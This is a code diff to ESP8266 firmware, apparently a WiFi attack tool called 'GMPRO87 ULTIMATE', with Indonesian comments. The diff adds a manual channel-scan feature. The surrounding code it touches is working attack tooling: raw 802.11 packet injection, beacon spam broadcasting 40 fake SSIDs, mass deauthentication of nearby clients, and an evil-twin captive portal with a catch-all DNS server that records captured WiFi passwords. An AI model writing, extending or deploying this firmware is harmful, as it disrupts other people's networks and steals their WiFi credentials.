@@ -21,12 +21,10 @@ extern "C" {
   int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
 }
 
-// --- CONFIG & HARDWARE ---
 #define OLED_RESET 0 
 Adafruit_SSD1306 display(OLED_RESET);
-const int LED_PIN = 2; // D4 Wemos
+const int LED_PIN = 2; 
 
-// --- BEACON SPAM DATA (40 NATURAL SSIDs) ---
 const char ssids[] PROGMEM = {
   "IndiHome-7728\nMyRepublic-Fiber\nBiznet_Home_5G\nFirstMedia_HighSpeed\nTPLINK_D82A\n"
   "ASUS_Router_Dual\nD-Link_Guest\nNetgear_Orbi\nHuawei-B311-662\nZTE_F609_Stable\n"
@@ -40,7 +38,6 @@ const char ssids[] PROGMEM = {
 
 uint8_t beaconPacket[109] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0xe8, 0x03, 0x21, 0x00, 0x00, 0x20 };
 
-// --- SNIFFER STRUCTURES ---
 struct RxControl { signed rssi: 8; unsigned rate: 4; unsigned is_group: 1; unsigned: 1; unsigned sig_mode: 2; unsigned legacy_length: 12; unsigned damatch0: 1; unsigned damatch1: 1; unsigned bssidmatch0: 1; unsigned bssidmatch1: 1; unsigned MCS: 7; unsigned CWB: 1; unsigned HT_length: 16; unsigned Smoothing: 1; unsigned Not_Sounding: 1; unsigned: 1; unsigned Aggregation: 1; unsigned STBC: 2; unsigned FEC_CODING: 1; unsigned SGI: 1; unsigned rxend_state: 8; unsigned ampdu_cnt: 8; unsigned channel: 4; unsigned: 12; };
 struct sniffer_buf2 { struct RxControl rx_ctrl; uint8_t buf[112]; uint16_t cnt; uint16_t len; };
 
@@ -48,12 +45,12 @@ typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; signed rssi; } _Netw
 _Network _networks[30]; 
 _Network _selectedNetwork;
 
-// --- GLOBAL STATE ---
 bool deauthing_active = false;
 bool deauth_all_active = false;
 bool hotspot_active = false;
 bool beacon_spam_active = false;
 bool password_found = false;
+bool is_scanning = false; // Flag Scan Manual
 int current_net_count = 0;
 uint8_t adminMAC[6] = {0};
 String _correct_info = "";
@@ -64,7 +61,7 @@ DNSServer dnsServer;
 
 unsigned long last_deauth = 0;
 unsigned long last_beacon = 0;
-unsigned long last_scan = 0;
+unsigned long scan_start_time = 0;
 
 void updateAdminWhitelist() {
   struct station_info *stat_info = wifi_softap_get_station_info();
@@ -79,7 +76,7 @@ void updateAdminWhitelist() {
 }
 
 void ICACHE_FLASH_ATTR promisc_cb(uint8 *buf, uint16 len) {
-  if (len == 128) {
+  if (len == 128 && is_scanning) {
     struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
     if (sniffer->buf[0] == 0x80) {
       String essid = "";
@@ -137,6 +134,7 @@ String bytesToStr(const uint8_t* b, uint32_t size) {
 
 void handleIndex() {
   updateAdminWhitelist();
+  if (webServer.hasArg("scan")) { is_scanning = true; current_net_count = 0; scan_start_time = millis(); }
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < current_net_count; i++) {
       if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) _selectedNetwork = _networks[i];
@@ -156,8 +154,13 @@ void handleIndex() {
   String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#000;color:#0f0;font-family:monospace;} button{background:#222;color:#0f0;border:1px solid #0f0;padding:10px;margin:5px;} .found{background:#ffea00;color:#000;padding:10px;font-weight:bold;}</style></head><body>";
   html += "<h2>GMPRO87 ULTIMATE</h2>";
   if(!hotspot_active) {
+    // TOMBOL SCAN MANUAL
+    html += "<a href='/?scan=1'><button style='background:#050;'>[ SCAN NETWORKS ]</button></a><br>";
     html += "<a href='/?beacon=" + String(beacon_spam_active?"stop":"start") + "'><button>BEACON: " + String(beacon_spam_active?"ON":"OFF") + "</button></a>";
     html += "<a href='/?deauthall=" + String(deauth_all_active?"stop":"start") + "'><button style='border-color:red; color:red;'>MASS DEAUTH: " + String(deauth_all_active?"ON":"OFF") + "</button></a><hr>";
+    
+    if(is_scanning) html += "<p style='color:orange;'>Scanning Channels... Please wait.</p>";
+
     html += "<table>";
     for(int i=0; i<current_net_count; i++) {
       html += "<tr><td>" + _networks[i].ssid + "</td><td><a href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button>SEL</button></a></td></tr>";
@@ -177,7 +180,7 @@ void handleIndex() {
     }
   }
   if(_correct_info != "") html += "<div class='found'>" + _correct_info + "</div>";
-  html += "<div style='font-size:9px; margin-top:20px;'>WL: " + bytesToStr(adminMAC, 6) + "</div></body></html>";
+  html += "</body></html>";
   webServer.send(200, "text/html", html);
 }
 
@@ -190,26 +193,41 @@ void setup() {
   Serial.begin(115200); pinMode(LED_PIN, OUTPUT);
   display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
   display.clearDisplay(); display.setTextColor(WHITE);
-  display.setCursor(0,10); display.println("GMPRO87 BOOT..."); display.display();
+  display.setCursor(0,10); display.println("GMPRO87 READY"); display.display();
 
-  // --- URUTAN SAKTI BIAR SSID MUNCUL ---
   WiFi.mode(WIFI_AP_STA);
+  // Admin WiFi dipaksa di Channel 1 biar gak ganti-ganti
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-  WiFi.softAP("GMpro", "Sangkur87"); // Nyalain WiFi dulu
+  WiFi.softAP("GMpro", "Sangkur87", 1); 
 
   dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
   webServer.on("/", handleIndex); webServer.on("/result", handleResult);
   webServer.onNotFound(handleIndex); webServer.begin();
 
-  delay(500); // Kasih waktu biar AP-nya stabil
-
-  // Baru sniffer nyala belakangan
   wifi_promiscuous_enable(1);
   wifi_set_promiscuous_rx_cb(promisc_cb);
 }
 
 void loop() {
   dnsServer.processNextRequest(); webServer.handleClient();
+
+  // Logika Scan Manual per Channel (1 detik per channel)
+  if (is_scanning) {
+    static int scan_ch = 1;
+    static unsigned long last_ch_millis = 0;
+    if (millis() - last_ch_millis > 1000) {
+      scan_ch++;
+      if (scan_ch > 13) { 
+        is_scanning = false; scan_ch = 1; 
+        wifi_set_channel(1); // Balikin ke channel admin
+      } else {
+        wifi_set_channel(scan_ch);
+      }
+      last_ch_millis = millis();
+    }
+    display.clearDisplay(); display.setCursor(0,0);
+    display.printf("SCANNING CH: %d\nNETS: %d", scan_ch, current_net_count); display.display();
+  }
 
   if (password_found) digitalWrite(LED_PIN, (millis() % 100 < 50)); 
   else if (deauthing_active || hotspot_active || deauth_all_active) digitalWrite(LED_PIN, (millis() % 400 < 200));
@@ -221,11 +239,4 @@ void loop() {
     last_deauth = millis();
   }
   if (beacon_spam_active && (millis() - last_beacon > 100)) { sendBeaconSpam(); last_beacon = millis(); }
-
-  if (!hotspot_active && (millis() - last_scan > 3000)) {
-    int ch = wifi_get_channel() + 1; if (ch > 13) ch = 1; wifi_set_channel(ch);
-    last_scan = millis();
-    display.clearDisplay(); display.setCursor(0,0); display.println("GMPRO87 ACTIVE");
-    display.printf("CH:%d NETS:%d\n", ch, current_net_count); display.display();
-  }
 }
